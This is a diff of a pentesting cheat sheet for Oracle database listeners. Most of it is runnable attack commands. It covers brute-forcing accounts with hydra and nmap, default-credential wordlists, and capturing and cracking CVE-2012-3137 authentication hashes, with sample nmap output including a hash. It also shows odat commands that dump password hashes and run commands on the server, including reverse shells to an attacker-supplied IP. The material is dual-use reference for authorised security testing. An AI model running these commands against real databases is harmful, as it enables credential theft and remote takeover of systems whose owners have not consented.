@@ -113,7 +113,18 @@ hydra -L /tmp/user.txt -P /tmp/pass.txt -s 1521 $SERVER oracle /$SID
 nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=$SID $SERVER
 ```
 
-Here are **mixed** wordlistst taken from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
+Here are **mixed** wordlists taken from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener) and some interesting other wordlists
+
+```bash
+# User/Password list
+cat /usr/share/nmap/nselib/data/oracle-default-accounts.lst
+
+# User Password list
+cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
+
+# User/Password list
+cat /usr/share/oscanner/accounts.default 
+```
 
 {% file src="../../../.gitbook/assets/pass-oracle.txt" %}
 
@@ -133,8 +144,63 @@ Below are some of the default passwords associated with Oracle:
 Other default passwords can be found [here ](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm)and [here](https://cirt.net/passwords?vendor=Oracle)
 {% endtab %}
 
-{% tab title="Steal Remote Pwds" %}
+{% tab title="Steal/Dump Passwords" %}
+### Stealremotepwds - CVE-2012-3137
 
+{% hint style="info" %}
+**The versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3 are vulnerable** to this technique
+{% endhint %}
+
+Using nmap we can retreive intercept the initial traffic during authorization phase and extract a hash to bruteforce it offline:
+
+```
+root@kali:~# nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
+
+Starting Nmap 6.49BETA4 (https://nmap.org) at 2016-03-02 14:58 EST
+Nmap scan report for 10.11.21.30
+PORT     STATE SERVICE
+1521/tcp open  oracle
+| oracle-brute-stealth:
+|   Accounts
+|     SYS:$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE86DF90880E09FAD3B4832CBCFDAC1
+|     A821D2EA8E3D2209DB6*4202433F49DE9AE72AE2 - 
+|     Hashed valid or invalid credentials
+|   Statistics
+|_    Performed 241 guesses in 12 seconds, average tps: 20
+
+john hashes.txt
+```
+
+Also, we can use odat
+
+```bash
+# Test module
+odat stealremotepwds -s <IP> -U <username> -P <password> -d <SID> --test-module
+
+# Obtain the session key and salt for user list
+odat stealremotepwds -s <IP> -U <username> -P <password> -d <SID> --get-all-passwords --user-list /usr/share/nmap/nselib/data/oracle-default-accounts.lst
+```
+
+### Dump Oracle Hashes
+
+Password hashes in Oracle are stored in the **sys.users$** or **dba\_users** tables. With permissions, we can extract them using odat
+
+```bash
+# Test the module before use it
+odat passwordstealer -s <IP> -U <username> -P <password> -d <SID> --test-module
+
+# Dump hashes
+odat passwordstealer -s <IP> -U <username> -P <password> -d <SID> --get-passwords
+
+# Dump hashes indirectly with CVE-2020-2984 for 12c or higher 
+odat passwordstealer -s <IP> -U <username> -P <password> -d <SID> --get-passwords-ocm
+
+# Dump hashes from history
+odat passwordstealer -s <IP> -U <username> -P <password> -d <SID> --get-passwords-from-history
+
+# Dump hashes with DBMS_STAT
+odat passwordstealer -s <IP> -U <username> -P <password> -d <SID> --get-passwords-dbms-stats
+```
 {% endtab %}
 {% endtabs %}
 
@@ -175,7 +241,11 @@ If an **account has system database priviledges (sysdba) or system operator (sys
 We can try to execute code using [odat](https://github.com/quentinhardy/odat) Java Stored Procedure
 
 ```bash
+# Execute commands
 odat java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
+
+# Get a reverse shell
+odat java -s <IP> -d <SID> -U <username> -P <password> --reverse-shell <ATTACKING_IP> <PORT>
 ```
 {% endtab %}
 
@@ -183,7 +253,11 @@ odat java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
 We can try to execute code using [odat](https://github.com/quentinhardy/odat) and Oracle Scheduler
 
 ```bash
+# Execute commands
 odat dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
+
+# Get a reverse shell
+odat dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --reverse-shell <ATTACKING_IP> <PORT>
 ```
 {% endtab %}
 
